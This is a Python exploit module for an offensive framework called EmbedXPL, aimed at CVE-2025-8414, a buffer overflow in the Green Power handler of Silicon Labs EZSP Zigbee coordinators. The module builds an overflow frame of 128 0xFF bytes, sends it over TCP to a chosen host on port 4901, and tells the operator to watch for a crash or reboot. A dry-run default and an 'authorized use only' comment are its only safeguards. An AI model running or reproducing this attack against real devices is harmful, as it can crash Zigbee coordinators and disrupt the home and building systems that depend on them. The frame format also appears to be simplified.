"""Zigbee EZSP Green Power Buffer Overflow (CVE-2025-8414).

Buffer overflow in the Zigbee EZSP (EmberZNet Serial Protocol) Green Power
cluster handler in Silicon Labs Gecko SDK.  A crafted Green Power frame
with an oversized applicationID field triggers an out-of-bounds write in
the frame processing path.  CVSS 8.8 (High).

Original research / PoC credits
--------------------------------
CVE     : CVE-2025-8414
CVSS    : 8.8 (High)
Source  : WirelessXPL-Forge wirelessxpl/modules/generic/iot_proto/zigbee/
          zigbee_ezsp_green_power_bof_cve_2025_8414.py

EmbedXPL port
-------------
Maintainer : Andre Henrique (@mrhenrike) | Uniao Geek

# authorized use only
"""
from __future__ import annotations

import socket
import struct

from embedxpl.core.exploit import *


_CVE = "CVE-2025-8414"

# Zigbee Green Power frame type
_GP_APPLICATION_ID_OVERFLOW = b"\xFF" * 128  # Overflow trigger payload


def _port_open(host: str, port: int, timeout: float) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


class Exploit(Exploit):
    """Zigbee EZSP Green Power Buffer Overflow (CVE-2025-8414)."""

    __info__ = {
        "name": "Zigbee EZSP Green Power BOF (CVE-2025-8414)",
        "description": (
            "Buffer overflow in Silicon Labs Gecko SDK EZSP Green Power handler. "
            "Crafted GP frame with oversized applicationID field triggers OOB write. "
            "Affects Zigbee coordinators/routers using Silicon Labs EZSP. CVSS 8.8 (High)."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2025-8414",
            "https://www.silabs.com/developers/zigbee-efr32-gecko-bootstrap",
        ),
        "devices": ("Silicon Labs EZSP-based Zigbee coordinators/routers",),
    }

    target = OptIP("", "Zigbee coordinator host IP (EZSP/TCP or MQTT bridge)")
    port = OptPort(4901, "EZSP TCP port (Silicon Labs Z3GatewayHost default)")
    dry_run = OptBool(True, "Dry run — show frame only")
    timeout = OptInteger(8, "Timeout in seconds")

    @mute
    def check(self) -> bool:
        host, port, timeout = str(self.target), int(self.port), float(self.timeout)
        if not host:
            return False
        return _port_open(host, port, timeout)

    def run(self) -> None:
        host, port, timeout = str(self.target), int(self.port), float(self.timeout)
        dry_run = bool(self.dry_run)

        print_status(f"Zigbee EZSP Green Power BOF probe — {_CVE}")

        # Build minimal EZSP GP frame with overflow applicationID
        frame = b"\x00\x01\x00" + struct.pack("B", len(_GP_APPLICATION_ID_OVERFLOW)) + \
                _GP_APPLICATION_ID_OVERFLOW

        print_info(f"GP overflow frame ({len(frame)} bytes): {frame[:32].hex()}…")

        if dry_run:
            print_info(
                "DRY-RUN: Frame not sent. Requires EZSP TCP connection to Silicon Labs "
                "Zigbee coordinator. Use zigpy/bellows library for full EZSP frame builder."
            )
            return

        if not host:
            print_error("No target IP specified")
            return

        if not _port_open(host, port, timeout):
            print_error(f"EZSP port {port} not reachable")
            return

        try:
            with socket.create_connection((host, port), timeout=timeout) as s:
                s.sendall(frame)
                print_success(f"GP overflow frame sent to {host}:{port}")
                print_info("Monitor coordinator for crash/reboot")
        except Exception as exc:
            print_error(f"Error: {exc}")
